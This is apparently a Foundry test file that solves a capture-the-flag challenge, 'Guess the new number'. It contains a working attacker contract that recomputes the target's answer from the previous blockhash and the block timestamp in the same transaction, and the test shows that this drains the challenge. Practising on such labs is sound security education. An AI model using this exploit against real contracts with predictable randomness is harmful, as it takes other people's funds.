// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {GuessNewNumber} from "src/GuessNewNumber.sol";

// #4 Guess the new number — jawaban dihitung di SAAT guess() dipanggil,
// dari blockhash(block.number-1) + block.timestamp blok yang sama.
// Attacker contract menghitung jawaban yang sama di transaksi yang sama.
contract GuessNewNumberAttacker {
    GuessNewNumber public target;

    constructor(GuessNewNumber _target) {
        target = _target;
    }

    function attack() external payable {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        );
        target.guess{value: 1 ether}(answer);
    }

    receive() external payable {}
}

contract GuessNewNumberSolve is Test {
    GuessNewNumber challenge;
    GuessNewNumberAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new GuessNewNumber{value: 1 ether}();
        attacker = new GuessNewNumberAttacker(challenge);
        vm.deal(address(attacker), 10 ether);
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
    }

    function testSolve() public {
        attacker.attack{value: 1 ether}();
        assertTrue(challenge.isComplete());
    }
}
